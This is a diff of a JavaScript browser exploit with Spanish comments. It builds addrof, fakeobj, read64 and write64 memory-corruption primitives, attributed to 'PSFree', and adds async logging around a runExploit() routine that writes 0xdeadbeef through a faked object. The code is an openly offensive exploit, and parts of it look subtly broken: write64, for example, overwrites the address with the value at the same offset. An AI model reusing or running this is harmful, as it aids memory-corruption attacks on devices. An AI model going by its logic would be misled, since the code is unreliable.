@@ -38,18 +38,29 @@ let obj_array = [1.1, 1.2];
 let obj = { m: 1 };
 let obj_bak = [obj];
 
-function gc() {
-  // Provoca una recolección de basura para liberar objetos y forzar el GC.
+// Función de registro asíncrono para monitoreo
+async function log(message) {
+  console.log(message);
+  // Si fuera necesario registrar en un archivo o servidor, se podría hacer aquí.
+  // await someServerLoggingFunction(message); // Si fuera necesario.
+}
+
+// Función que provoca la recolección de basura
+async function gc() {
+  await log("Triggering garbage collection...");
   for (let i = 0; i < 10000; i++) {
     let tmp = new ArrayBuffer(0x10000); // Genera basura para que el GC lo procese.
   }
+  await log("Garbage collection complete.");
 }
 
 // Primitivas necesarias para la explotación: read, write, addrof, fakeobj
 let addrof, fakeobj, read64, write64;
 
 // Función que prepara las primitivas para interactuar con la memoria.
-function setupPrimitives() {
+async function setupPrimitives() {
+  await log("Setting up primitives...");
+  
   // Utiliza PSFree para manipular el heap con overlap y corrupción de objetos.
   addrof = function(o) {
     obj_bak[0] = o;  // Backup del objeto para evitar sobrescritura.
@@ -74,17 +85,24 @@ function setupPrimitives() {
     fake_view.setBigUint64(0, BigInt(addr), true);  // Coloca la dirección.
     fake_view.setBigUint64(0, BigInt(val), true);  // Coloca el valor que deseas escribir.
   };
+
+  await log("Primitives setup complete.");
 }
 
 // Lanzar recolección de basura y preparar primitivas.
-gc();
-setupPrimitives();
+async function runExploit() {
+  await gc();
+  await setupPrimitives();
 
-// Test de las primitivas
-let addr = addrof({ test: 1337 });
-console.log("Address of test object: 0x" + addr.toString(16));
+  // Test de las primitivas
+  let addr = addrof({ test: 1337 });
+  await log("Address of test object: 0x" + addr.toString(16));
 
-// Corromper memoria a través de fakeobj y escribir un valor.
-let fake = fakeobj(addr + 0x20);
-write64(addr + 0x10, 0xdeadbeef); // Escribe un valor en una ubicación específica.
-console.log("Fake object manipulation complete.");
+  // Corromper memoria a través de fakeobj y escribir un valor.
+  let fake = fakeobj(addr + 0x20);
+  write64(addr + 0x10, 0xdeadbeef); // Escribe un valor en una ubicación específica.
+  await log("Fake object manipulation complete.");
+}
+
+// Ejecutar la explotación con monitoreo
+runExploit();
